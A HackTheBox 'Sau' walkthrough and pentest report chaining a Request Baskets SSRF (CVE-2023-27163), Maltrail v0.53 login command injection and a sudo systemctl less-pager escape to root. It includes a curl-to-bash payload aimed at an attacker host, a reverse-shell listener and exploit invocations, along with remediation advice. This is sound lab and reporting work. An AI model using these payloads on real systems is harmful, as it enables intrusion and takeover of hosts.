# Sau

**Platform:** HackTheBox
**OS:** Linux
**Tags:** CVE-2023-27163, SSRF, Request Baskets, Maltrail, Command Injection, sudo, RCE, Privilege Escalation
**Date:** 2026-06-18

Request Baskets 1.2.1 on port 55555 is vulnerable to SSRF (CVE-2023-27163). Crafted baskets proxy requests from the server's loopback, bypassing the external firewall on ports 80 and 8338. Forwarding through reveals Maltrail v0.53, which passes the login `username` field unsanitised into a shell command. Exploiting the injection gives a shell as `puma`. Root via `sudo systemctl status` invoking `less` as root, escaped with `!bash`.

## 1. Enumeration

Two open ports, two filtered. The filtered ones are the story.

```bash
nmap -sC -sV -p- 10.129.21.212
```

Findings:
- 22/tcp - OpenSSH 8.2p1 (Ubuntu)
- 80/tcp - filtered, HTTP (firewall drops external traffic)
- 8338/tcp - filtered, unknown service
- 55555/tcp - Request Baskets (Golang), redirects to `/web`

Ports 80 and 8338 are filtered. The firewall blocks them externally, but the machine can reach them via localhost. Port 55555 is Request Baskets, a webhook tool that lets you create HTTP endpoints and forward traffic wherever you want. That forward_url is the bug.

## 2. SSRF (CVE-2023-27163): Request Baskets

Request Baskets <= 1.2.1 allows unauthenticated users to create baskets with a configurable `forward_url`. Any request to the basket is proxied by the server to that URL. Because the server initiates the request from localhost, it bypasses the external firewall and can reach filtered internal ports.

Creating a basket that forwards to `127.0.0.1:80`:

```bash
./CVE-2023-27163.sh http://10.129.21.212:55555 http://127.0.0.1:80
```

The script creates the basket and returns a URL in the form `http://10.129.21.212:55555/<basket_name>`. Visiting that URL proxies the request through the server to `127.0.0.1:80`.

**Result:** Internal service on port 80 revealed: `Powered by Maltrail (v0.53)`.

## 3. Command Injection: Maltrail v0.53

Maltrail v0.53 passes the `username` field from the login endpoint directly to a shell command without sanitisation. An attacker can inject arbitrary OS commands by sending a crafted POST to `/login`, reached here through the SSRF basket.

Set up a listener, then run the exploit against the basket URL:

```bash
nc -lvnp 4444
```

```bash
python3 exploit.py <ATTACKER_IP> 4444 http://10.129.21.212:55555/<basket_name>
```

**Result:** Reverse shell as `puma`. User flag at `/home/puma/user.txt`.

## 4. Privilege Escalation

Checking sudo permissions as `puma`:

```bash
sudo -l
```

- NOPASSWD: `(ALL : ALL) /usr/bin/systemctl status trail.service`

`systemctl status` pipes its output through `less`. Since it runs under `sudo`, `less` is invoked as root. `less` allows arbitrary command execution via `!`.

```bash
sudo /usr/bin/systemctl status trail.service
```

Inside the pager, type:

```
!bash
```

**Result:** Root shell. Root flag at `/root/root.txt`.

## 5. Flags

- User: `redacted`
- Root: `redacted`

---

## Penetration Test Report

**Target:** sau.htb
**Address:** 10.129.21.212
**Assessment type:** External network & web application assessment
**Assessment date:** 18 June 2026
**Environment:** HackTheBox laboratory assessment  |  Linux
**Prepared by:** Ledion Mujaj
**Reference:** 01 / 09

---

## 1. Executive Summary

### Assessment outcome

Testing of **sau.htb** identified two critical and one high severity finding. Assessment obtained an interactive shell as `puma` through a chain of an unauthenticated server-side request forgery and unauthenticated command injection, then escalated to root by abusing a sudo-permitted systemctl invocation that spawned an interactive pager.
Request Baskets 1.2.1, running on the internet-facing port 55555, is vulnerable to CVE-2023-27163. An unauthenticated attacker can create a basket with a configurable forward URL, causing the server to proxy arbitrary HTTP requests from its own loopback interface. This bypassed the external firewall protecting ports 80 and 8338, revealing Maltrail v0.53 on port 80.
Maltrail v0.53 contains an unauthenticated OS command injection in its login endpoint. The `username` parameter is passed unsanitised to a shell command. Exploiting this through the SSRF basket delivered a reverse shell as `puma` .
The `puma` account was permitted to run `/usr/bin/systemctl status trail.service` as root without a password. The systemctl output was piped through `less` , which ran with root effective privileges and allowed shell escape via the `!` command.

### Priority recommendations

1. Upgrade Request Baskets to a version beyond 1.2.1, or restrict basket creation to authenticated users.
2. Upgrade Maltrail or remove it; sanitise all user-supplied input passed to shell commands.
3. Remove the passwordless sudo delegation for systemctl and replace it with a purpose-scoped alternative.

## 2. Assessment Scope and Methodology

### 2.1 Target and observed services

| Asset | Address | Description |
| --- | --- | --- |
| sau.htb | 10.129.21.212 | Ubuntu Linux; Request Baskets on port 55555, SSH on port 22 |
| Port | Service | Observed detail |
| --- | --- | --- |
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | HTTP | Filtered externally; Maltrail v0.53 accessible via SSRF |
| 8338/tcp | Unknown | Filtered externally; unreachable without SSRF |
| 55555/tcp | HTTP | Request Baskets v1.2.1 (Golang); redirects to /web |

```
nmap -sC -sV -p- 10.129.21.212

PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
80/tcp    filtered http
8338/tcp  filtered unknown
55555/tcp open     unknown
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.0 302 Found
|     Location: /web
```

### 2.2 Approach

Testing began with a full-port service scan. The filtered ports 80 and 8338 indicated a host-based firewall permitting only loopback access. Request Baskets on port 55555 was identified as vulnerable to CVE-2023-27163. A basket was created with a forward URL pointing to `127.0.0.1:80` , exposing the Maltrail service. The Maltrail login endpoint was tested for command injection using a public exploit. Post-shell enumeration identified the passwordless sudo rule.

### 2.3 Severity classification

| Rating | Assessment criteria |
| --- | --- |
| Critical | Direct, readily exploitable compromise with exceptional impact or reach. |
| High | Execution of arbitrary code, significant unauthorised access or escalation to administrative privileges. |
| Medium | Meaningful exposure with constrained impact or substantial exploitation prerequisites. |
| Low | Limited direct impact; improvement to an existing security control. |

## 3. Results Overview

### 3.1 Findings summary

| Reference | Finding | Severity | Page |
| --- | --- | --- | --- |
| [F-01](#f-01) | SSRF in Request Baskets 1.2.1 (CVE-2023-27163) | **Critical** | 6 |
| [F-02](#f-02) | Unauthenticated command injection in Maltrail v0.53 | **Critical** | 7 |
| [F-03](#f-03) | Root shell via sudo systemctl less pager escape | **High** | 8 |

### 3.2 Compromise sequence

| Stage | Action | Access obtained |
| --- | --- | --- |
| 01 | Created a Request Baskets basket with forward_url pointing to 127.0.0.1:80, bypassing the external firewall. | Internal HTTP proxy |
| 02 | Injected an OS command in the Maltrail login username field via the SSRF basket, triggering a reverse shell. | puma shell |
| 03 | Ran sudo systemctl status trail.service; escaped the less pager with !bash. | root shell |

### 3.3 Relationship between findings

F-01 was the access path to F-02. Without the SSRF, Maltrail was unreachable externally. F-03 required the `puma` shell obtained via F-02. The three findings describe a single kill chain; however, each control failure is independently remediable and the order in which they are corrected does not affect validity.

## 4.1 Server-Side Request Forgery in Request Baskets

### F-01   CVE-2023-27163 - Request Baskets 1.2.1 - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Request Baskets 1.2.1 allows unauthenticated users to create HTTP baskets with a configurable `forward_url` . When a request is sent to a basket, the server proxies it from its own loopback address to the specified forward URL. An attacker can set the forward URL to any internal address, bypassing external network controls and accessing services that are firewalled from the internet. |
| Prerequisites | Network access to port 55555. No authentication required to create a basket. |
| Impact | The SSRF revealed Maltrail v0.53 running on the internal port 80. This was the access path for the unauthenticated command injection in F-02. Internal services not intended to be externally accessible were exposed to an unauthenticated remote attacker. |
| Affected system | sau.htb:55555 Request Baskets v1.2.1 CVE-2023-27163 |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-918](https://cwe.mitre.org/data/definitions/918.html) : Server-Side Request Forgery (SSRF) |

### Steps to reproduce

1. Navigate to the Request Baskets web UI on port 55555.
2. Create a new basket and configure it with a forward URL of `http://127.0.0.1:80/` and enable "Proxy Response".
3. Send a GET request to `http://<TARGET_IP>:55555/<basket-name>` and observe the proxied response from the internal service.
4. Identify Maltrail v0.53 running on the internal port from the response body.

### Evidence

```
# Exploit script creates a basket proxying requests to internal port 80
./CVE-2023-27163.sh http://10.129.21.212:55555 http://127.0.0.1:80

# Script output:
Basket created: http://10.129.21.212:55555/<basket_name>
Forwarding to:  http://127.0.0.1:80

# Visiting the basket URL proxies to the internal Maltrail instance
curl http://10.129.21.212:55555/<basket_name>
# Response body includes: Powered by Maltrail (v0.53)
```

Evidence E-01. SSRF confirmed: request to the basket URL returns a response from the internal port-80 service. Maltrail v0.53 identified from the response body.

### Remediation

Upgrade Request Baskets to a version that addresses CVE-2023-27163. Where upgrading is not immediately possible, restrict basket creation to authenticated users and apply an allowlist to the permitted forward URL targets, blocking loopback and private address ranges. Apply host firewall rules that also prevent the application process from initiating outbound connections to internal services it should not access.

### Verification

Confirm that an unauthenticated request to create a basket with a loopback forward URL is rejected. Verify that the patched version is installed and that internal services remain unreachable via the basket proxy.

## 4.2 Unauthenticated Command Injection in Maltrail v0.53

### F-02   Maltrail v0.53 login endpoint injection - CRITICAL

| Field | Assessment |
| --- | --- |
| Description | Maltrail v0.53 passes the `username` parameter from the `/login` endpoint directly into a shell command without sanitisation. An unauthenticated attacker can inject arbitrary OS commands by embedding shell metacharacters in the username field. The injection executes with the privileges of the Maltrail service process. |
| Prerequisites | HTTP access to the Maltrail login endpoint. In this assessment, access was obtained via the SSRF basket (F-01). No credentials are required. |
| Impact | Arbitrary OS command execution as `puma` . Interactive reverse shell obtained; user flag at `/home/puma/user.txt` retrieved. |
| Affected system | 127.0.0.1:80 (reached via SSRF basket) Maltrail v0.53 - /login endpoint |
| CVSS 3.1 | **9.8** (Critical) [AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) : Improper Neutralisation of Special Elements used in an OS Command |

### Steps to reproduce

1. Using the SSRF basket from the previous finding, proxy requests to Maltrail's login endpoint at `/login` .
2. Send a POST request with the body: `username=;curl+http://<ATTACKER_IP>/<payload>|bash` .
3. Confirm command execution by observing a callback to the attacker-controlled server.
4. Replace the payload with a reverse shell one-liner to obtain an interactive shell as `puma` .

### Evidence

```
# Set up listener
nc -lvnp 4444

# Run exploit against the SSRF basket URL
python3 exploit.py <ATTACKER_IP> 4444 \
  http://10.129.21.212:55555/<basket_name>

# Exploit sends POST to /login with injected username:
# username=;curl+http://<ATTACKER_IP>/rev.sh|bash;&

# Reverse shell connects:
puma@sau:/opt/maltrail$ id
uid=1001(puma) gid=1001(puma) groups=1001(puma)

puma@sau:~$ cat /home/puma/user.txt
[redacted]
```

Evidence E-02. Command injection delivered through the SSRF basket. Shell received as `puma` on port 4444. Attacker IP redacted.

### Remediation

Upgrade Maltrail to a version that sanitises user-supplied input before passing it to shell commands. If no patched version is available, remove or isolate Maltrail. Apply input validation that rejects or escapes shell metacharacters in the login username parameter. Restrict network access to the Maltrail login endpoint to authorised addresses only.

### Verification

Confirm that a crafted username containing shell metacharacters does not produce OS command execution. Verify that the login endpoint is unreachable from untrusted external sources, including via SSRF chains.

## 4.3 Root Shell via sudo systemctl and less Pager Escape

### F-03   sudo systemctl status → less → !bash - HIGH

| Field | Assessment |
| --- | --- |
| Description | The `puma` account was permitted to run `/usr/bin/systemctl status trail.service` as root without a password. When the terminal is smaller than the output, systemctl pipes its output through `less` . Because systemctl is running as root, the `less` process also inherits root privileges. The `less` pager allows arbitrary command execution via the `!` escape character, which executes the given command with the current effective user - root. |
| Prerequisites | Access to the `puma` account and a terminal with fewer rows than the systemctl output length. |
| Impact | Arbitrary OS commands executed as root. Full host compromise. |
| Affected system | `/etc/sudoers` - puma sudo rule `/usr/bin/systemctl` |
| CVSS 3.1 | **7.8** (High) [AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| CWE | [CWE-269](https://cwe.mitre.org/data/definitions/269.html) : Improper Privilege Management |

### Steps to reproduce

1. Check sudo rights from the `puma` shell: `sudo -l` .
2. Observe that `sudo /usr/bin/systemctl status trail.service` is permitted without a password.
3. Run `sudo /usr/bin/systemctl status trail.service` - the output is paged through `less` .
4. When the `less` pager is active, type `!bash` and press Enter to spawn a root shell.

### Evidence

```
puma@sau:~$ sudo -l
(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service

puma@sau:~$ sudo /usr/bin/systemctl status trail.service
# Output truncated; less pager invoked

# Inside the less pager, type:
!bash

# Shell spawned as root:
root@sau:/# whoami
root

root@sau:/# cat /root/root.txt
[redacted]
```

Evidence E-03. The less pager is invoked by systemctl when the output exceeds the terminal height. The `!` command in less executes the argument with root privileges. Reference: [GTFOBins: less](https://gtfobins.github.io/gtfobins/less/) .

### Remediation

Remove the sudo rule for systemctl. If service status inspection by `puma` is a genuine operational requirement, replace the rule with a purpose-scoped script that does not invoke a pager and does not allow arbitrary command execution. Alternatively, restrict the delegation to a read-only monitoring account without shell access. Disable the pager in any remaining systemctl sudo invocations via `SYSTEMD_PAGER=cat` .

### Verification

Confirm that `puma` cannot execute systemctl as root. If a replacement delegation is introduced, verify that it does not spawn an interactive pager or permit command execution.

## 5. Remediation and Assessment Closeout

### 5.1 Corrective action plan

| Priority | Action | Reference |
| --- | --- | --- |
| Immediate | Upgrade or remove Request Baskets; block loopback forward URLs. | F-01 |
| Immediate | Upgrade or remove Maltrail; restrict login endpoint access. | F-02 |
| High | Remove passwordless sudo delegation for systemctl. | F-03 |
No remediation retest is documented. Each finding includes verification criteria for closure.

### 5.2 Test artefacts

| Location | Purpose | Removal status |
| --- | --- | --- |
| Reverse shell payload delivered via Maltrail exploit | Command injection and shell access test | Not verified |

### 5.3 Evidence and limitations

Evidence blocks are sourced from the [Sau assessment walkthrough](sau-htb.html) . Flag values and attacker IP addresses are omitted from all evidence. The assessment did not include a source-code review of Maltrail or Request Baskets.

### 5.4 Evidence index

| Reference | Supporting record |
| --- | --- |
| E-01 | Walkthrough section 2: SSRF basket creation and internal service discovery |
| E-02 | Walkthrough section 3: Maltrail command injection and shell access as puma |
| E-03 | Walkthrough section 4: sudo systemctl, less pager escape and root shell |
